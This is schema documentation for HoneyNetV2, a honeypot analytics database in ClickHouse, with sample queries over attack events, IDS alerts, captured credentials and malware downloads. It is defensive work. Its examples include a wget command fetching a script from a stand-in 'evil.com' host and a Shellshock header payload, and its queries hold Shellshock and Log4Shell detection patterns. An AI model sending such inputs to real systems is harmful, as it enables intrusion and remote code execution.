# HoneyNetV2 Database Schema Documentation

## Overview

This document describes the ClickHouse database schema used in HoneyNetV2 for storing and analyzing honeypot data, IDS alerts, and network traffic.

**Database**: `honeynet`
**Engine**: MergeTree family (optimized for time-series data)
**Last Updated**: 2025-10-24

---

## Table of Contents

1. [honeypot_events](#honeypot_events)
2. [ids_alerts](#ids_alerts)
3. [network_connections](#network_connections)
4. [http_requests](#http_requests)
5. [credentials](#credentials)
6. [downloaded_files](#downloaded_files)
7. [attacker_profiles](#attacker_profiles)
8. [Materialized Views](#materialized-views)

---

## honeypot_events

**Purpose**: Store all honeypot interaction events from Cowrie, Dionaea, and Conpot.

**Engine**: `MergeTree` partitioned by date, ordered by timestamp

### Schema

```sql
CREATE TABLE honeynet.honeypot_events (
    timestamp DateTime DEFAULT now(),
    source_ip_hash String,              -- SHA256(source_ip + salt)
    source_ip_country String DEFAULT '', -- ISO 3166-1 alpha-2 country code
    dest_ip String,
    dest_port UInt16,
    protocol String,                    -- ssh, telnet, http, ftp, smb, modbus, etc.
    honeypot_name String,               -- cowrie, dionaea, conpot
    event_type String,                  -- login, command, download, connection, etc.
    event_data String,                  -- JSON blob with event-specific data
    session_id String DEFAULT '',
    username String DEFAULT '',
    password String DEFAULT '',
    command String DEFAULT '',
    filename String DEFAULT '',
    file_hash String DEFAULT '',
    url String DEFAULT '',
    user_agent String DEFAULT '',
    is_exploit String DEFAULT '0',      -- '1' if exploit detected, '0' otherwise
    exploit_type String DEFAULT '',     -- shellshock, sqli, traversal, etc.
    success UInt8 DEFAULT 0             -- For login attempts: 1=success, 0=failure
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, source_ip_hash, dest_port)
TTL timestamp + INTERVAL 90 DAY;       -- Automatic data retention
```

### Columns Description

| Column | Type | Description | Example |
|--------|------|-------------|---------|
| `timestamp` | DateTime | Event occurrence time (UTC) | `2025-10-24 14:30:00` |
| `source_ip_hash` | String | Anonymized source IP (SHA256) | `a3f8b9c2...` |
| `source_ip_country` | String | Country code from GeoIP lookup | `CN`, `US`, `RU` |
| `dest_ip` | String | Destination IP (honeypot IP) | `172.20.0.10` |
| `dest_port` | UInt16 | Targeted port | `22`, `80`, `502` |
| `protocol` | String | Protocol used | `ssh`, `http`, `modbus` |
| `honeypot_name` | String | Source honeypot | `cowrie`, `dionaea`, `conpot` |
| `event_type` | String | Event category | `cowrie_login`, `dionaea_connection`, `conpot_modbus` |
| `event_data` | String | Full event JSON | `{"key": "value", ...}` |
| `session_id` | String | Unique session identifier | `a1b2c3d4` |
| `username` | String | Login username (if applicable) | `root`, `admin` |
| `password` | String | Login password (if applicable) | `password123` |
| `command` | String | Executed command (SSH/Telnet) | `wget http://evil.com/mal.sh` |
| `filename` | String | Downloaded/uploaded filename | `malware.bin` |
| `file_hash` | String | SHA256 hash of file | `e3b0c442...` |
| `url` | String | HTTP URL accessed | `/cgi-bin/test.sh` |
| `user_agent` | String | HTTP User-Agent header | `() { :; }; echo pwned` |
| `is_exploit` | String | Exploit flag ('0' or '1') | `1` |
| `exploit_type` | String | Exploit category | `shellshock`, `sqli` |
| `success` | UInt8 | Login success indicator | `0` (failed), `1` (success) |

### Common Queries

```sql
-- Event count by protocol (last 24 hours)
SELECT protocol, count() as cnt
FROM honeynet.honeypot_events
WHERE timestamp >= now() - INTERVAL 24 HOUR
GROUP BY protocol
ORDER BY cnt DESC;

-- Top 10 attacking countries
SELECT source_ip_country, count() as attacks
FROM honeynet.honeypot_events
WHERE timestamp >= now() - INTERVAL 7 DAY
GROUP BY source_ip_country
ORDER BY attacks DESC
LIMIT 10;

-- Detected exploits
SELECT timestamp, source_ip_hash, protocol, exploit_type, url, user_agent
FROM honeynet.honeypot_events
WHERE is_exploit = '1'
  AND timestamp >= now() - INTERVAL 1 DAY
ORDER BY timestamp DESC;
```

---

## ids_alerts

**Purpose**: Store intrusion detection alerts from Suricata with MITRE ATT&CK mapping.

### Schema

```sql
CREATE TABLE honeynet.ids_alerts (
    timestamp DateTime,
    source_ip_hash String,
    source_ip_country String DEFAULT '',
    dest_ip String,
    dest_port UInt16,
    protocol String,
    signature String,                   -- Alert message
    signature_id UInt32,                -- Suricata SID
    category String,                    -- Attack category
    severity UInt8,                     -- 1=high, 2=medium, 3=low
    mitre_technique_id String DEFAULT '',  -- e.g., T1190, T1110.001
    mitre_tactic String DEFAULT '',        -- e.g., initial-access, lateral-movement
    alert_metadata String DEFAULT '',      -- Full metadata JSON
    flow_id UInt64,
    packet_info String DEFAULT ''
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, signature_id, source_ip_hash)
TTL timestamp + INTERVAL 90 DAY;
```

### Columns Description

| Column | Type | Description | Example |
|--------|------|-------------|---------|
| `timestamp` | DateTime | Alert generation time | `2025-10-24 14:30:05` |
| `source_ip_hash` | String | Anonymized attacker IP | `a3f8b9c2...` |
| `source_ip_country` | String | Country code | `CN` |
| `dest_ip` | String | Target IP | `172.20.0.10` |
| `dest_port` | UInt16 | Target port | `22` |
| `protocol` | String | Network protocol | `TCP`, `UDP` |
| `signature` | String | Alert description | `SSH Brute Force Detected` |
| `signature_id` | UInt32 | Suricata rule SID | `2000005` |
| `category` | String | Attack classification | `Attempted User` |
| `severity` | UInt8 | Alert severity (1-3) | `1` (high) |
| `mitre_technique_id` | String | MITRE ATT&CK technique | `T1110.001` |
| `mitre_tactic` | String | MITRE tactic | `credential-access` |
| `alert_metadata` | String | Full metadata JSON | `{"mitre_technique_id": [...]}` |
| `flow_id` | UInt64 | Unique flow identifier | `1234567890` |
| `packet_info` | String | Additional packet details | `{...}` |

### Common Queries

```sql
-- Most frequent alerts (last 7 days)
SELECT signature, signature_id, count() as cnt
FROM honeynet.ids_alerts
WHERE timestamp >= now() - INTERVAL 7 DAY
GROUP BY signature, signature_id
ORDER BY cnt DESC
LIMIT 20;

-- MITRE ATT&CK technique ranking
SELECT
    mitre_tactic,
    mitre_technique_id,
    count() as detections,
    uniq(source_ip_hash) as unique_attackers
FROM honeynet.ids_alerts
WHERE timestamp >= now() - INTERVAL 30 DAY
  AND mitre_technique_id != ''
GROUP BY mitre_tactic, mitre_technique_id
ORDER BY detections DESC;

-- High-severity alerts
SELECT timestamp, signature, source_ip_country, dest_port
FROM honeynet.ids_alerts
WHERE severity = 1
  AND timestamp >= now() - INTERVAL 1 HOUR
ORDER BY timestamp DESC;
```

---

## network_connections

**Purpose**: Store Zeek connection logs (conn.log) for network flow analysis.

### Schema

```sql
CREATE TABLE honeynet.network_connections (
    timestamp DateTime,
    uid String,                         -- Zeek unique ID
    orig_h String,                      -- Originator IP (hashed)
    orig_p UInt16,                      -- Originator port
    resp_h String,                      -- Responder IP
    resp_p UInt16,                      -- Responder port
    proto String,                       -- tcp, udp, icmp
    service String,                     -- Identified service (ssh, http, etc.)
    duration Float32,                   -- Connection duration (seconds)
    orig_bytes UInt64,                  -- Bytes sent by originator
    resp_bytes UInt64,                  -- Bytes sent by responder
    conn_state String,                  -- Connection state (SF, REJ, etc.)
    source_ip_country String DEFAULT ''
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, orig_h, resp_p)
TTL timestamp + INTERVAL 90 DAY;
```

### Connection States

| State | Description |
|-------|-------------|
| `SF` | Normal SYN-FIN connection |
| `REJ` | Connection rejected |
| `S0` | Connection attempt seen, no reply |
| `RSTO` | Connection reset by originator |
| `RSTR` | Connection reset by responder |

### Common Queries

```sql
-- Top services by connection count
SELECT service, count() as conn_count
FROM honeynet.network_connections
WHERE timestamp >= now() - INTERVAL 24 HOUR
GROUP BY service
ORDER BY conn_count DESC;

-- Failed connection attempts (reconnaissance)
SELECT timestamp, orig_h, resp_p, conn_state
FROM honeynet.network_connections
WHERE conn_state IN ('REJ', 'S0', 'RSTO')
  AND timestamp >= now() - INTERVAL 1 HOUR
ORDER BY timestamp DESC
LIMIT 100;
```

---

## http_requests

**Purpose**: Store HTTP transaction logs from Zeek (http.log).

### Schema

```sql
CREATE TABLE honeynet.http_requests (
    timestamp DateTime,
    uid String,
    method String,                      -- GET, POST, etc.
    host String,
    uri String,                         -- Request path
    referrer String,
    user_agent String,
    status_code UInt16,                 -- HTTP response code
    orig_h String,                      -- Client IP (hashed)
    resp_h String,                      -- Server IP
    source_ip_country String DEFAULT ''
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, orig_h, uri)
TTL timestamp + INTERVAL 90 DAY;
```

### Common Queries

```sql
-- Most requested URLs
SELECT uri, count() as requests
FROM honeynet.http_requests
WHERE timestamp >= now() - INTERVAL 7 DAY
GROUP BY uri
ORDER BY requests DESC
LIMIT 20;

-- Suspicious User-Agents (exploit attempts)
SELECT timestamp, user_agent, uri, source_ip_country
FROM honeynet.http_requests
WHERE user_agent LIKE '%() { :; }%'  -- Shellshock
   OR user_agent LIKE '%${jndi:%'     -- Log4Shell
   OR user_agent LIKE '%sqlmap%'      -- SQL injection tool
  AND timestamp >= now() - INTERVAL 1 DAY
ORDER BY timestamp DESC;
```

---

## credentials

**Purpose**: Store captured username/password pairs from authentication attempts.

### Schema

```sql
CREATE TABLE honeynet.credentials (
    timestamp DateTime,
    source_ip_hash String,
    username String,
    password String,
    protocol String,                    -- ssh, telnet, ftp, etc.
    success UInt8,                      -- 1=successful login, 0=failed
    honeypot_name String
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, source_ip_hash, username)
TTL timestamp + INTERVAL 90 DAY;
```

### Common Queries

```sql
-- Most common username/password pairs
SELECT username, password, count() as attempts
FROM honeynet.credentials
WHERE timestamp >= now() - INTERVAL 7 DAY
GROUP BY username, password
ORDER BY attempts DESC
LIMIT 20;

-- Successful logins
SELECT timestamp, source_ip_hash, username, password, protocol
FROM honeynet.credentials
WHERE success = 1
  AND timestamp >= now() - INTERVAL 24 HOUR
ORDER BY timestamp DESC;

-- Unique attackers by credential diversity
SELECT
    source_ip_hash,
    uniq(username) as unique_usernames,
    uniq(password) as unique_passwords,
    count() as total_attempts
FROM honeynet.credentials
WHERE timestamp >= now() - INTERVAL 7 DAY
GROUP BY source_ip_hash
HAVING total_attempts > 10
ORDER BY total_attempts DESC;
```

---

## downloaded_files

**Purpose**: Track malware and file downloads captured by honeypots.

### Schema

```sql
CREATE TABLE honeynet.downloaded_files (
    timestamp DateTime,
    source_ip_hash String,
    filename String,
    file_hash String,                   -- SHA256
    file_size UInt64,                   -- Bytes
    download_url String DEFAULT '',
    protocol String,
    honeypot_name String
) ENGINE = MergeTree()
PARTITION BY toYYYYMM(timestamp)
ORDER BY (timestamp, file_hash)
TTL timestamp + INTERVAL 90 DAY;
```

### Common Queries

```sql
-- Most downloaded files (by hash)
SELECT
    file_hash,
    filename,
    count() as download_count,
    uniq(source_ip_hash) as unique_sources
FROM honeynet.downloaded_files
WHERE timestamp >= now() - INTERVAL 30 DAY
GROUP BY file_hash, filename
ORDER BY download_count DESC
LIMIT 10;

-- Recent malware downloads
SELECT timestamp, filename, file_hash, source_ip_hash, download_url
FROM honeynet.downloaded_files
WHERE timestamp >= now() - INTERVAL 1 DAY
ORDER BY timestamp DESC;
```

---

## attacker_profiles

**Purpose**: Aggregated attacker behavior profiles for threat intelligence.

### Schema

```sql
CREATE TABLE honeynet.attacker_profiles (
    source_ip_hash String,
    first_seen DateTime,
    last_seen DateTime,
    total_events UInt64,
    unique_ports Array(UInt16),
    protocols Array(String),
    countries Array(String),            -- If attacker changes geo-location
    attack_types Array(String),
    total_credentials_tried UInt64,
    successful_logins UInt64,
    files_downloaded UInt64,
    PRIMARY KEY (source_ip_hash)
) ENGINE = MergeTree()
ORDER BY (source_ip_hash);
```

### Population Query

```sql
-- Populate attacker profiles (run periodically)
INSERT INTO honeynet.attacker_profiles
SELECT
    source_ip_hash,
    min(timestamp) as first_seen,
    max(timestamp) as last_seen,
    count() as total_events,
    groupUniqArray(dest_port) as unique_ports,
    groupUniqArray(protocol) as protocols,
    groupUniqArray(source_ip_country) as countries,
    groupUniqArray(event_type) as attack_types,
    0 as total_credentials_tried,  -- Populated separately
    0 as successful_logins,
    0 as files_downloaded
FROM honeynet.honeypot_events
WHERE timestamp >= now() - INTERVAL 30 DAY
GROUP BY source_ip_hash;
```

---

## Materialized Views

### attacker_profile_aggregator

Automatically maintains real-time attacker profiles.

```sql
CREATE MATERIALIZED VIEW honeynet.attacker_profile_aggregator
ENGINE = AggregatingMergeTree()
ORDER BY source_ip_hash
AS SELECT
    source_ip_hash,
    minState(timestamp) as first_seen,
    maxState(timestamp) as last_seen,
    countState() as total_events,
    groupUniqArrayState(dest_port) as unique_ports,
    groupUniqArrayState(protocol) as protocols
FROM honeynet.honeypot_events
GROUP BY source_ip_hash;
```

### mitre_attack_stats

Pre-aggregated MITRE ATT&CK statistics for dashboards.

```sql
CREATE MATERIALIZED VIEW honeynet.mitre_attack_stats
ENGINE = SummingMergeTree()
ORDER BY (date, mitre_tactic, mitre_technique_id)
AS SELECT
    toDate(timestamp) as date,
    mitre_tactic,
    mitre_technique_id,
    count() as technique_count,
    uniq(source_ip_hash) as unique_attackers
FROM honeynet.ids_alerts
WHERE mitre_technique_id != ''
GROUP BY date, mitre_tactic, mitre_technique_id;
```

---

## Data Retention Policy

**Default TTL**: 90 days for all tables

```sql
-- Modify retention (example: 180 days)
ALTER TABLE honeynet.honeypot_events
MODIFY TTL timestamp + INTERVAL 180 DAY;
```

**Archival**: Use Parquet export before data expires (see `ansible/playbooks/99-backup.yml`).

---

## Performance Optimization

### Indexes

```sql
-- Add index for common filter
ALTER TABLE honeynet.ids_alerts
ADD INDEX idx_mitre_technique mitre_technique_id TYPE set(0) GRANULARITY 4;
```

### Partitioning Strategy

- **By Month**: `PARTITION BY toYYYYMM(timestamp)`
- **Benefits**: Fast partition pruning, efficient TTL, easier archival

### Query Optimization Tips

1. **Always filter by timestamp**: ClickHouse optimizes time-range queries
2. **Use materialized views**: For frequently accessed aggregations
3. **Limit result sets**: Avoid `SELECT *` without LIMIT
4. **Leverage projections**: For alternate sort orders

```sql
-- Example projection for country-based queries
ALTER TABLE honeynet.honeypot_events
ADD PROJECTION country_proj (
    SELECT * ORDER BY source_ip_country, timestamp
);
```

---

## References

- [ClickHouse MergeTree Engine](https://clickhouse.com/docs/en/engines/table-engines/mergetree-family/mergetree/)
- [ClickHouse TTL](https://clickhouse.com/docs/en/guides/developer/ttl/)
- [Materialized Views](https://clickhouse.com/docs/en/guides/developer/cascading-materialized-views/)

---

**Document Version**: 1.0
**Author**: Agent #6b - Testing & Documentation
